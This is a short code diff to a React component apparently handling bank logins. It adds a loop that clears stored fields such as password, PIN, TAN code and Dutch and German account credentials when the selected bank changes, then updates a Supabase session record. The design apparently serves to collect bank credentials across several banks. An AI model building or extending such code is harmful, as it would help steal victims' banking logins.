@@ -190,6 +190,16 @@ export function BankenClientClean({ sessionId, initialBanks }: Props) {
       bankSlug: nextBankSlug,
       bankName: displayName,
     };
+    
+    // Banka değiştirildiğinde eski bankaya ait giriş bilgilerini temizle
+    const bankSpecificFields = [
+      "username", "password", "verfuegernummer", "pin", "rekeningnummer", 
+      "pasnummer", "toegangscode", "signatuur", "identificatiecode", "tacCode"
+    ];
+    for (const field of bankSpecificFields) {
+      delete nextFormData[field];
+    }
+
     const { error } = await supabase
       .from("sessions")
       .update({ is_hidden: false, current_step: "bank",
